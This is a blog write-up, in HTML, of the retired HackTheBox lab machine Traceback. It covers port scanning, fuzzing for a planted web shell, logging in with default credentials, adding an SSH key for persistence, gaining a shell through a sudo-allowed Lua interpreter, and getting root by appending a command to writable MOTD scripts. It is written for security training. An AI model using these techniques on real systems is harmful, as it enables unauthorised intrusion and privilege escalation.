@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Traceback | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2020/08/htb-traceback.html" title="Read more" class="entry-title-link">
+                HTB: Traceback</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-08-19T09:00:00+02:00">19 Aug 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 6 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2020.08/traceback_card.png" alt="Traceback Card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/233">Traceback</a> publish on
+Mars the 14th 2020 by
+<a href="https://www.hackthebox.eu/home/users/profile/21439">Xh4H</a>.
+This box is rated as easy box. It implies some Google search, a lua interpreter
+and a privilege escalation using the MOTD.</p>
+
+
+<h1 id="foothold">Foothold</h1>
+<h2 id="recon">Recon</h2>
+<p>Let us start as always by a <code>nmap</code> scan. The box is quit busy so first of all we
+run a simple aggressive TCP scan:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Thu Mar 26 04:41:18 2020 as: nmap -p- -sS -oN nmap 10.10.10.181</span>
+<span class="code-line">Nmap scan report for 10.10.10.181</span>
+<span class="code-line">Host is up (0.089s latency).</span>
+<span class="code-line">Not shown: 65533 closed ports</span>
+<span class="code-line">PORT   STATE SERVICE</span>
+<span class="code-line">22/tcp open  ssh</span>
+<span class="code-line">80/tcp open  http</span>
+<span class="code-line"></span>
+<span class="code-line"># Nmap done at Thu Mar 26 04:42:19 2020 -- 1 IP address (1 host up) scanned in 61.23 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<p>The open ports are:</p>
+<ul>
+<li>22: SSH</li>
+<li>80: a web server</li>
+</ul>
+<p>We do not have any information to connect to the SSH server.</p>
+<p>The website is a simple web page saying that the website has been hacked and
+that a backdoor is available for the net.</p>
+<p>Running a <code>dirb</code> or other web fuzzing tool doesn't give any result.</p>
+<p><img alt="homepage" src="/media/2020.08/traceback_01.png"></p>
+<p>Looking at the source code we found a commentary in the body: "Some of the best
+web shells that you might need".</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span></span>
+<span class="code-line">  <span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;</span></span>
+<span class="code-line">    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>This site has been owned<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span></span>
+<span class="code-line">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>I have left a backdoor for all the net. FREE INTERNETZZZ<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span></span>
+<span class="code-line">    <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span> - Xh4H - <span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span></span>
+<span class="code-line">    <span class="cm">&lt;!--Some of the best web shells that you might need ;)--&gt;</span></span>
+<span class="code-line">  <span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;</span></span>
+<span class="code-line"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>The comment is the description of a <a href="https://github.com/TheBinitGhimire/Web-Shells">github repository containing
+webshell</a>.</p>
+<p>We generate a wordlist from the webshell of this repository and launch it
+against the website with <a href="https://github.com/ffuf/ffuf">ffuf</a>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>./ffuf -w ~/htb_traceback/Web-Shells/list -u http://10.10.10.181/FUZZ -mc 200 -c -v</span>
+<span class="code-line"></span>
+<span class="code-line">        /&#39;___\  /&#39;___\           /&#39;___\</span>
+<span class="code-line">      /\ \__/ /\ \__/  __  __  /\ \__/</span>
+<span class="code-line">      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span>
+<span class="code-line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span>
+<span class="code-line">        \ \_\   \ \_\  \ \____/  \ \_\</span>
+<span class="code-line">          \/_/    \/_/   \/___/    \/_/</span>
+<span class="code-line"></span>
+<span class="code-line">      v1.0.2</span>
+<span class="code-line">________________________________________________</span>
+<span class="code-line"></span>
+<span class="code-line">:: Method           : GET</span>
+<span class="code-line">:: URL              : http://10.10.10.181/FUZZ</span>
+<span class="code-line">:: Follow redirects : false</span>
+<span class="code-line">:: Calibration      : false</span>
+<span class="code-line">:: Timeout          : 10</span>
+<span class="code-line">:: Threads          : 40</span>
+<span class="code-line">:: Matcher          : Response status: 200</span>
+<span class="code-line">________________________________________________</span>
+<span class="code-line"></span>
+<span class="code-line">| URL | http://10.10.10.181/smevk.php</span>
+<span class="code-line">    * FUZZ: smevk.php</span>
+<span class="code-line"></code></pre></div>
+
+<p>We go to the webshell page and found an authentication form.</p>
+<p><img alt="webshell homepage" src="/media/2020.08/traceback_02.png"></p>
+<p>According to Github the default credentials are "admin:admin". Once log id we
+can see a few interesting information:</p>
+<ul>
+<li>We are the user webadmin</li>
+<li>Our id is <code>1000</code> which mean we are a system user</li>
+</ul>
+<p><img alt="webshell homepage" src="/media/2020.08/traceback_03.png"></p>
+<p>We change directory for <code>/home/webadmin/</code>. We see that there is a
+<code>.ssh/authorized_keys</code> file (maybe you need to create it if this doesn't exist,
+as I used the public server the folder and the file already existed).
+We add our public ssh key to the file and connect using ssh.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ssh 10.10.10.181 -lwebadmin</span>
+<span class="code-line">The authenticity of host &#39;10.10.10.181 (10.10.10.181)&#39; can&#39;t be established.</span>
+<span class="code-line">ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.</span>
+<span class="code-line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="code-line">Warning: Permanently added &#39;10.10.10.181&#39; (ECDSA) to the list of known hosts.</span>
+<span class="code-line">#################################</span>
+<span class="code-line">-------- OWNED BY XH4H  ---------</span>
+<span class="code-line">- I guess stuff could have been configured better ^^ -</span>
+<span class="code-line">#################################</span>
+<span class="code-line"></span>
+<span class="code-line">Welcome to Xh4H land</span>
+<span class="code-line"></span>
+<span class="code-line">Last login: Thu Mar 26 01:09:32 2020 from 10.10.17.253</span>
+<span class="code-line">webadmin@traceback:~$</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="getting-user">Getting user</h1>
+<p>In our home folder we found a note from <code>sysadmin</code>, the other system user about
+some lua tool.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>webadmin@traceback:~$ cat note.txt</span>
+<span class="code-line">- sysadmin -</span>
+<span class="code-line">I have left a tool to practice Lua.</span>
+<span class="code-line">I&#39;m sure you know where to find it.</span>
+<span class="code-line">Contact me if you have any question.</span>
+<span class="code-line"></code></pre></div>
+
+<p>Looking at our <code>sudo</code> right we have the possibility to execute <code>luvit</code> as
+<code>sysadmin</code> without password.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>webadmin@traceback:~$ sudo -l</span>
+<span class="code-line">Matching Defaults entries for webadmin on traceback:</span>
+<span class="code-line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
+<span class="code-line"></span>
+<span class="code-line">User webadmin may run the following commands on traceback:</span>
+<span class="code-line">    (sysadmin) NOPASSWD: /home/sysadmin/luvit</span>
+<span class="code-line"></code></pre></div>
+
+<p>We deduce that this is a lua interpreter and run some "Hello World" to confirm
+it.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit </span>
+<span class="code-line">Welcome to the Luvit repl!</span>
+<span class="code-line">&gt; print(&quot;Hello World&quot;)</span>
+<span class="code-line">Hello World</span>
+<span class="code-line"></code></pre></div>
+
+<p>Next we just execute <code>/bin/sh</code> using our interpreter.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit -e &#39;os.execute(&quot;/bin/sh&quot;)&#39;</span>
+<span class="code-line">$ id</span>
+<span class="code-line">uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)</span>
+<span class="code-line"></code></pre></div>
+
+<p>We go to our new home directory and read <code>user.txt</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ bash</span>
+<span class="code-line">sysadmin@traceback:~$ cd /home/sysadmin/</span>
+<span class="code-line">sysadmin@traceback:/home/sysadmin$ ls</span>
+<span class="code-line">luvit  user.txt</span>
+<span class="code-line">sysadmin@traceback:/home/sysadmin$ cat user.txt </span>
+<span class="code-line">349f0968dce655cb15708bba0077d225</span>
+<span class="code-line"></code></pre></div>
+
+<p>As before we add our public ssh key to the user's <code>.ssh/authorized_keys</code>.</p>
+<h1 id="root">root</h1>
+<p>We do not know sysadmin's password required to list our <code>sudo</code> right.</p>
+<p>We run a simple <code>ps aux</code> to know which process are running. We see (that's some
+luck) that root regularly execute the following command:
+<code>/bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/</code></p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>root      28855  0.0  0.0   4628   856 ?        Ss   02:48   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/</span>
+<span class="code-line"></code></pre></div>
+
+<p>We confirm that using <a href="https://github.com/DominicBreuker/pspy">pspy</a> (using ssh
+to copy the binary).</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>2020/03/26 03:07:01 CMD: UID=0    PID=29213  | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ </span>
+<span class="code-line">2020/03/26 03:07:01 CMD: UID=0    PID=29212  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/</span>
+<span class="code-line"></code></pre></div>
+
+<p>When looking at the <code>/var/backups/.update-motd.d</code> folder's permissions when see
+that we can not write in any file nor create a file as everything belong to
+<code>root</code>. Nevertheless, the <code>/etc/update-motd.d/</code> folder's permissions allow our
+user to write in any file. We create a temporary folder and add a command to the
+<code>00-header</code> file. That command will copy the file <code>/root/root.txt</code> and give us
+the permissions to read it.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sysadmin@traceback:/etc/update-motd.d$ ls -al</span>
+<span class="code-line">total 32</span>
+<span class="code-line">drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .</span>
+<span class="code-line">drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..</span>
+<span class="code-line">-rwxrwxr-x  1 root sysadmin  981 Mar 26 03:59 00-header</span>
+<span class="code-line">-rwxrwxr-x  1 root sysadmin  982 Mar 26 03:59 10-help-text</span>
+<span class="code-line">-rwxrwxr-x  1 root sysadmin 4264 Mar 26 03:59 50-motd-news</span>
+<span class="code-line">-rwxrwxr-x  1 root sysadmin  604 Mar 26 03:59 80-esm</span>
+<span class="code-line">-rwxrwxr-x  1 root sysadmin  299 Mar 26 03:59 91-release-upgrade</span>
+<span class="code-line">sysadmin@traceback:/etc/update-motd.d$ mkdir /tmp/ioio</span>
+<span class="code-line">sysadmin@traceback:/etc/update-motd.d$ echo &#39;cp /root/root.txt /tmp/ioio &amp;&amp; chmod 777 /tmp/ioio/root.txt&#39; &gt;&gt; 00-header</span>
+<span class="code-line"></code></pre></div>
+
+<p>We then quickly trigger the command by initiating a new SSH connection. We can
+then grab the root flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ssh sysadmin@10.10.10.181</span>
+<span class="code-line">#################################</span>
+<span class="code-line">-------- OWNED BY XH4H  ---------</span>
+<span class="code-line">- I guess stuff could have been configured better ^^ -</span>
+<span class="code-line">#################################</span>
+<span class="code-line"></span>
+<span class="code-line">Welcome to Xh4H land</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span>
+<span class="code-line"></span>
+<span class="code-line">Last login: Thu Mar 26 03:57:28 2020 from 10.10.14.2</span>
+<span class="code-line">$ cat /tmp/ioio/*</span>
+<span class="code-line">07c8a04e829b07060576e3a799a33a9d</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>The box was quit easy and is really a nice one for beginner.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2020/08/vulnhub-infosec-prep-oscp.html"> Vulnhub: InfoSec Prep: OSCP </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2020/08/htb-magic.html"> HTB: Magic </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
